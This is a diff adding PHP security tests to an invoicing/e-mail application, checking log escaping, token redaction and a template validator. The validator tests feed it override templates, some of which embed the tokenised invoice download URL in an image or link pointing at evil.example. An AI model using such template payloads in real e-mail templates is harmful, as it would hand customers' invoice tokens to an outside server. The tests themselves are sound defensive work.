@@ -24,3 +24,13 @@ assert_true(substr_count(rtrim($r9lLogged, "\r\n"), "\n") === 0 && str_contains(
     'R9 logs: CR/LF and control characters are escaped, so the message stays one line and cannot forge another');
 assert_equals(['response' => '{"access_token":"[REDACTED]","expires_in":3600}'], Logger::redact(['response' => '{"access_token":"r9l-tok-5","expires_in":3600}']),
     'R9 logs: the structured log masks a token inside a JSON string as well');
+
+// Template guard: the invoice link carries the download token (#token) but was not a secret variable, so an override
+// could put it into an image or another site's URL and hand the invoice to that server.
+$r9lInvoiceErrors = static fn(string $html, string $text = ''): string => implode(' ', EmailTemplates::validate('invoice_issued', 'Invoice {{invoice_number}}', $html, $text));
+$r9lShipped = EmailTemplates::fileSource('invoice_issued', 'en');
+assert_equals('', $r9lInvoiceErrors((string)$r9lShipped['html'], (string)($r9lShipped['text'] ?? '')), 'R9 template guard: the shipped invoice e-mail (link and plain URL) passes');
+foreach (['<p><img src="https://evil.example/p.gif?u={{invoice_download_url}}" alt=""></p>', '<p><a href="https://evil.example/?next={{invoice_download_url}}">Invoice</a></p>',
+    '<p><a href="{{invoice_download_url}}" title="{{invoice_download_url}}">Invoice</a></p>'] as $r9lLeak) {
+    assert_true(str_contains($r9lInvoiceErrors($r9lLeak), 'invoice_download_url'), 'R9 template guard: the invoice link may not be part of another URL or attribute (' . $r9lLeak . ')');
+}
